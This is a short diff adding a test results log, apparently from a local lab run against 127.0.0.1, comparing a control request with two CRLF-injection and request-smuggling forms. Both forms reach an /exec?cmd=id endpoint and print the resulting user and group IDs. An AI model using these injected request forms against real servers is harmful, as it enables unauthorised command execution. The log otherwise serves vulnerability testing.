@@ -1,0 +1,8 @@
+--- control GET /hello.txt
+    HTTP/1.1 200 OK | x-saw: GET /hello.txt HTTP/1.1<CR><LF>Host: 127.0.0.1:19501<CR><LF>Connection: close | Content-Length: 11 | Connection: close |  | UPSTREAM_OK
+--- Form A: encoded-CRLF header injection, exec on the request line
+    HTTP/1.1 200 OK | x-saw: GET /exec?cmd=id<CR><LF>X-Inj: 1 HTTP/1.1<CR><LF>Host: 127.0.0.1:19501<CR><LF>Connection: close | Content-Length: 138 | Connection: close |  | EXEC[id]=uid=1000(mouse9911) gid=1000(mouse9911) groups=1000(mouse9911),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),100(users),101(lxd)
+
+--- Form B: injected second request after a real CRLFCRLF
+    HTTP/1.1 200 OK | x-saw: GET /exec?cmd=id<CR><LF>X:1 | Content-Length: 138 | Connection: close |  | EXEC[id]=uid=1000(mouse9911) gid=1000(mouse9911) groups=1000(mouse9911),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),100(users),101(lxd)
+
